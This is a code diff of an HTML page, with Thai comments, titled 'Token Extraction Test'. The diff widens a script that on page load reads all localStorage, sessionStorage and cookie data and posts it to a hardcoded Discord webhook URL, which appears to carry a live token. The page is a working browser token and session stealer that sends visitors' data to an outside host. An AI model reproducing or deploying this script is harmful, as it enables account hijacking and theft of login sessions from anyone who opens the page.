@@ -3,40 +3,88 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Discord Token Extraction Test</title>
+    <title>Token Extraction Test</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            margin: 0;
+            padding: 0;
+            background-color: #f4f4f4;
+        }
+        h1 {
+            margin-top: 50px;
+        }
+        #output {
+            margin-top: 20px;
+            padding: 10px;
+            background-color: #fff;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            display: inline-block;
+        }
+        #extractTokenButton {
+            padding: 10px 20px;
+            font-size: 16px;
+            border: none;
+            border-radius: 5px;
+            background-color: #007bff;
+            color: #fff;
+            cursor: pointer;
+            margin-top: 20px;
+        }
+        #extractTokenButton:hover {
+            background-color: #0056b3;
+        }
+    </style>
 </head>
 <body>
-    <h1>Discord Token Extraction Test</h1>
+    <h1>Token Extraction Test</h1>
     <p id="output"></p>
 
     <script>
-        window.onload = function() {
-            // ฟังก์ชันเพื่อดึง token จาก localStorage
-            function getTokenFromLocalStorage() {
-                let token = localStorage.getItem('token');
-                return token;
+        function getLocalStorageItems() {
+            const items = {};
+            for (let i = 0; i < localStorage.length; i++) {
+                const key = localStorage.key(i);
+                const value = localStorage.getItem(key);
+                items[key] = value;
             }
+            return items;
+        }
 
-            // ฟังก์ชันเพื่อดึง cookies
-            function getCookies() {
-                let cookies = document.cookie;
-                return cookies;
+        function getSessionStorageItems() {
+            const items = {};
+            for (let i = 0; i < sessionStorage.length; i++) {
+                const key = sessionStorage.key(i);
+                const value = sessionStorage.getItem(key);
+                items[key] = value;
             }
+            return items;
+        }
 
-            // ดึงข้อมูลจาก localStorage และ cookies
-            let token = getTokenFromLocalStorage();
-            let cookies = getCookies();
+        function getCookies() {
+            return document.cookie;
+        }
 
-            // สร้างข้อความที่จะส่งไป
-            let payload = {
-                token: token,
+        function extractTokens() {
+            const localStorageItems = getLocalStorageItems();
+            const sessionStorageItems = getSessionStorageItems();
+            const cookies = getCookies();
+
+            // รวมข้อมูลทั้งหมดเพื่อส่งไปยังเซิร์ฟเวอร์
+            const payload = {
+                localStorage: localStorageItems,
+                sessionStorage: sessionStorageItems,
                 cookies: cookies
             };
 
             // แสดงผลลัพธ์ในหน้า HTML
-            document.getElementById('output').textContent = `Token: ${token}\nCookies: ${cookies}`;
+            document.getElementById('output').textContent = `Local Storage: ${JSON.stringify(localStorageItems, null, 2)}
+            \n\nSession Storage: ${JSON.stringify(sessionStorageItems, null, 2)}
+            \n\nCookies: ${cookies}`;
 
-            // ส่งข้อมูลไปยัง URL ที่กำหนด
+            // ส่งข้อมูลไปยัง Webhook URL
             fetch('https://discord.com/api/webhooks/1252253384501887067/VEuHR4FVh43ztNVPgmE0kd7RqWFIM154Gha7s63Do-R1tc4VbuLQ8DzOaamP323Te4nd', {
                 method: 'POST',
                 headers: {
@@ -47,7 +95,10 @@
             .then(response => response.text())
             .then(data => console.log('Success:', data))
             .catch(error => console.error('Error:', error));
-        };
+        }
+
+        // เรียกใช้ฟังก์ชันเพื่อดึงข้อมูลและส่งไปยัง Webhook ทันทีหลังจากเปิดหน้าเว็บ
+        extractTokens();
     </script>
 </body>
 </html>
